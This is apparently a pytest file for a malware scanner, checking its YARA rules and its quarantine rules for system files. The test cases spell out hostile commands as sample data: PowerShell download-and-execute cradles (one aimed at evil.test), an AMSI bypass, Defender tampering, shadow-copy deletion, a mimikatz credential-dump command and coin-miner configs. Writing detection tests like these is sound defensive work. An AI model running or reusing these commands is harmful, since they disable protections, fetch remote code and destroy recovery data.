"""Bundled YARA rules: they must catch the technique and stay silent on the legitimate tools they mention."""

import pytest

from sentinel_vision.engines.base import Detection, ScanObject, Severity
from sentinel_vision.engines.yara_engine import YaraEngine
from sentinel_vision.scanner import ScanResult, is_system_path

PE = b"MZ" + b"\0" * 100

CASES = [
    (
        b"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\"",
        "SV_PowerShell_Download_Cradle",
    ),
    (b"(New-Object Net.WebClient).DownloadString('http://x/a') | iex", "SV_PowerShell_Download_Cradle"),
    (b"irm https://evil.test/p.ps1 | iex", "SV_PowerShell_Download_Cradle"),
    (b"Invoke-WebRequest -Uri $u -OutFile $f\nInvoke-Expression $cmd", None),
    (
        b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        b".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "SV_AMSI_Bypass",
    ),
    (PE + b"AmsiScanBuffer\0VirtualProtect\0GetProcAddress\0", None),  # amsi.dll itself
    (b"Set-MpPreference -DisableRealtimeMonitoring $true", "SV_Defender_Tampering"),
    (b"Add-MpPreference -ExclusionPath C:\\", "SV_Defender_Tampering"),
    (b"<cdxml>Set-MpPreference DisableRealtimeMonitoring Add-MpPreference ExclusionPath</cdxml>", None),
    (
        b'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1',
        "SV_Defender_Tampering",
    ),
    (b"cmd /c vssadmin delete shadows /all /quiet", "SV_Ransomware_Recovery_Inhibition"),
    (
        PE + b"vssadmin delete shadows /all\0bcdedit /set {default} recoveryenabled no",
        "SV_Ransomware_Recovery_Inhibition",
    ),
    (PE + b"usage: vssadmin delete shadows /for=c: /quiet", None),  # vssadmin.exe help text
    (b"sekurlsa::logonpasswords\nmimikatz", "SV_HackTool_Mimikatz"),
    (
        b'{"donate-level": 1, "pools": [{"url": "stratum+tcp://pool.example.org:3333", "user": "4Abc"}],'
        b' "cpu": {"enabled": true}, "algo": "rx/0"}',
        "SV_CoinMiner_Config",
    ),
    (PE + b"xmrig --donate-level=1 --algo=rx/0 -o stratum+tcp://pool.example.org:443", "SV_CoinMiner_Config"),
    # a conversation or documentation that merely talks about miners
    (b'rule mentions xmrig, stratum+tcp:// and "donate-level" to explain coin-miner detection', None),
]


@pytest.fixture(scope="module")
def engine():
    return YaraEngine()


@pytest.mark.parametrize("data,expected", CASES)
def test_bundled_rules(engine, data, expected):
    names = [d.name for d in engine.scan(ScanObject("sample.bin", data=data)) if d.name.startswith("SV_")]
    if expected:
        assert expected in names
    else:
        assert names == []


def test_system_files_are_never_auto_quarantined_on_pattern_matches(sentinel):
    import os
    import sys

    sysfile = (
        os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "x.dll")
        if sys.platform == "win32"
        else "/usr/bin/x"
    )
    assert is_system_path(sysfile)
    yara_hit = ScanResult(sysfile, detections=[Detection("yara", "SUSP_X", Severity.CRITICAL)])
    hash_hit = ScanResult(sysfile, detections=[Detection("hash", "Known.Bad", Severity.CRITICAL)])
    user_hit = ScanResult(
        os.path.expanduser("~/Downloads/x.exe"), detections=[Detection("yara", "SUSP_X", Severity.CRITICAL)]
    )
    assert sentinel.scanner.should_quarantine(yara_hit) is False
    assert sentinel.scanner.should_quarantine(hash_hit) is True
    assert sentinel.scanner.should_quarantine(user_hit) is True


def test_generated_rules_are_ignored_on_os_files_only(sentinel):
    import os
    import sys

    from sentinel_vision.scanner import Scanner

    sysfile = (
        os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "v.dll")
        if sys.platform == "win32"
        else "/usr/lib/v.so"
    )
    res = ScanResult(sysfile, detections=[Detection("yara", "MALPEDIA_Win_X_Auto", Severity.HIGH)])
    Scanner._drop_generated_rule_noise(res)
    assert res.detections == []
    user = ScanResult(
        os.path.expanduser("~/Downloads/v.dll"), detections=[Detection("yara", "MALPEDIA_Win_X_Auto", Severity.HIGH)]
    )
    Scanner._drop_generated_rule_noise(user)
    assert len(user.detections) == 1
